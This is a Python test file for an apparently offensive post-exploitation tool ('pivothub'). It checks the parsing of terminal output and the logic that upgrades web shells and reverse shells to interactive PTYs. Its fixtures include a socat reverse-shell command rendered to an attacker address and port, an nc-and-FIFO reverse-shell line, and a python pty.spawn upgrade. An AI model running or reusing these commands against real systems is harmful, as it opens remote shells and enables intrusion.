"""终端固化（M1-8）判定逻辑测试：解析函数全部基于真实回显样本。

样本取自 Debian/Ubuntu 真机行为（ttyp WebShell 场景的标准输出）。
"""

from __future__ import annotations

from pivothub.service.tty import (
    judge_mode,
    parse_pty_verify,
    parse_stty_size,
    parse_term_output,
    parse_tty_output,
    parse_which_output,
)

# ---- 真实回显样本 ----

TTY_NOT_A_TTY = "not a tty"
TTY_PTS = "/dev/pts/3"
STTY_ERR = "stty: 'standard input': Inappropriate ioctl for device"
STTY_OK = "40 120"
WHICH_OUT = "/usr/bin/python3\n/usr/bin/script\n/usr/bin/nc"
# python pty.spawn 内执行 `tty; echo "TERM=$TERM"; stty size; id` 的真实形态
PTY_VERIFY_OUT = (
    "/dev/pts/3\n"
    "TERM=xterm-256color\n"
    "40 120\n"
    "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
)


def test_parse_tty_output_real_samples():
    assert parse_tty_output(TTY_NOT_A_TTY) is False
    assert parse_tty_output(TTY_PTS) is True
    assert parse_tty_output("/dev/ttyS0") is True
    assert parse_tty_output("/dev/ttys003") is True  # macOS
    assert parse_tty_output("") is False


def test_parse_term_output():
    assert parse_term_output("dumb\n") == "dumb"
    assert parse_term_output("xterm-256color\n") == "xterm-256color"
    assert parse_term_output("") == ""


def test_parse_stty_size_real_samples():
    assert parse_stty_size(STTY_OK) == (40, 120)
    assert parse_stty_size(STTY_ERR) is None
    assert parse_stty_size("") is None


def test_parse_which_output():
    tools = parse_which_output(WHICH_OUT)
    assert "python3" in tools and "script" in tools and "nc" in tools
    assert parse_which_output("") == []


def test_judge_mode_three_states():
    assert judge_mode(False, "dumb", None, "linux") == "dumb"
    assert judge_mode(True, "dumb", None, "linux") == "semi"
    assert judge_mode(True, "", None, "linux") == "semi"
    assert judge_mode(True, "xterm-256color", (40, 120), "linux") == "full"
    assert judge_mode(False, "xterm", None, "windows") == "dumb"


def test_parse_pty_verify_accepts_real_pty_echo():
    v = parse_pty_verify(PTY_VERIFY_OUT)
    assert v["hasPty"] is True
    assert v["tty"] == "/dev/pts/3"
    assert v["term"] == "xterm-256color"
    assert v["sttySize"] == [40, 120]
    assert "uid=33(www-data)" in v["uid"]


def test_parse_pty_verify_rejects_dumb_or_missing():
    # 无 pts → 不是 PTY
    v1 = parse_pty_verify("TERM=xterm-256color\n40 120\nuid=0(root)")
    assert v1["hasPty"] is False
    # TERM=dumb → 不是可用交互 PTY
    v2 = parse_pty_verify("/dev/pts/1\nTERM=dumb\n40 120\nuid=0(root)")
    assert v2["hasPty"] is False
    # stty 失败 → 不是可用交互 PTY
    v3 = parse_pty_verify("/dev/pts/1\nTERM=xterm\n" + STTY_ERR)
    assert v3["hasPty"] is False


def test_upgrade_reverse_technique_returns_rendered_cmd():
    """反向技法（socat/nc）返回按攻击机地址渲染的命令 + 明确指引，不再是「待 MS3」占位。"""
    from pivothub.service.tty import technique_kind, upgrade

    class Dummy:
        supports_pty_probe = False
        platform = "linux"
        kind = "http-shell"

        def exec(self, cmd, timeout=15.0):
            raise AssertionError("reverse 技法不应直接执行命令（需先开监听）")

    fix = {"id": "lx-socat", "name": "socat 全交互 PTY",
           "cmd": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT"}
    assert technique_kind(fix) == "reverse"
    out = upgrade(Dummy(), fix, lhost="10.8.0.14", lport=4444)
    assert out["hasPty"] is False
    assert out["cmd"] == ("socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
                          "tcp:10.8.0.14:4444")          # $LHOST/$LPORT 已按攻击机渲染
    assert "开监听" in out["reason"] and "MS3" not in out["reason"]


def test_upgrade_pty_technique_on_reverse_channel():
    """反弹通道本身就是交互 shell：PTY 技法经通道原始写入 + 回读验证，不再报「驱动不支持」。"""
    from pivothub.service.tty import upgrade

    class FakeChannel:
        kind = "reverse-shell"
        platform = "linux"
        supports_pty_probe = False                # 通道驱动不该被 PTY 探针门槛卡住
        raw_written = []

        def write_raw(self, text):
            self.raw_written.append(text)

        def exec(self, cmd, timeout=15.0):
            return type("R", (), {
                "ok": True, "error": "",
                "output": "/dev/pts/2\nTERM=xterm-256color\n40 120\nuid=0(root)\n"})()

    fix = {"id": "lx-python", "name": "Python PTY",
           "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"}
    ch = FakeChannel()
    out = upgrade(ch, fix)
    assert out["hasPty"] is True and out["viaChannel"] is True
    assert out["tty"] == "/dev/pts/2" and out["term"] == "xterm-256color"
    assert ch.raw_written and "pty.spawn" in ch.raw_written[0]
    # 已是反弹通道时，反向技法明确说明「不适用」，而不是默默失败
    rev = upgrade(ch, {"id": "lx-nc-fifo", "name": "nc + FIFO 反向交互",
                       "cmd": "rm /tmp/f; mkfifo /tmp/f; nc $LHOST $LPORT > /tmp/f"})
    assert rev["hasPty"] is False and rev["fallback"] == "channel"
    assert "已是反弹" in rev["reason"]


def test_upgrade_inline_technique_executes_and_verifies():
    from pivothub.service.tty import technique_kind, upgrade

    class FakeSession:
        platform = "linux"
        supports_pty_probe = False
        sent = []

        def exec(self, cmd, timeout=15.0):
            self.sent.append(cmd)
            if "TERM" in cmd and "echo" in cmd:
                return type("R", (), {"ok": True, "output": "TERM=xterm-256color", "error": ""})()
            return type("R", (), {"ok": True, "output": "", "error": ""})()

    fix = {"id": "lx-env", "name": "环境变量修正",
           "cmd": "export TERM=xterm-256color; export SHELL=/bin/bash"}
    s = FakeSession()
    assert technique_kind(fix) == "inline"
    out = upgrade(s, fix)
    assert out["execOk"] is True
    assert out["term"] == "xterm-256color"
    assert any("TERM=xterm-256color" in c for c in s.sent)
